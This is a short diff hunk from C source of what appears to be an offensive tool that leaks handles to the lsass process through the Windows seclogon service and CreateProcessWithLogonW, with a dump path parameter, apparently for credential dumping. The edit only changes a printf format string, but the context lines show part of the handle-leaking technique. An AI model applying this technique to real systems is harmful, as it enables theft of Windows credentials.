@@ -292,7 +292,7 @@ void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath) {
 		startInfo.hStdInput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
 		startInfo.hStdOutput = (HANDLE)handlesToLeak[leakedHandlesCounter++];
 		startInfo.hStdError = (HANDLE)handlesToLeak[leakedHandlesCounter++];
-		printf("Attempt to leak process handles from lsass: 0x%p 0x%p 0x%p...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
+		printf("Attempt to leak process handles from lsass: 0x%04x 0x%04x 0x%04x...\n", startInfo.hStdInput, startInfo.hStdOutput, startInfo.hStdError);
 		if (!CreateProcessWithLogonW(L"MalseclogonUser", L"MalseclogonDomain", L"MalseclogonPwd", LOGON_NETCREDENTIALS_ONLY, moduleFilename, newCmdline, 0, NULL, NULL, &startInfo, &procInfo)) {
 			printf("CreateProcessWithLogonW() failed with error code %d \n", GetLastError());
 			exit(-1);
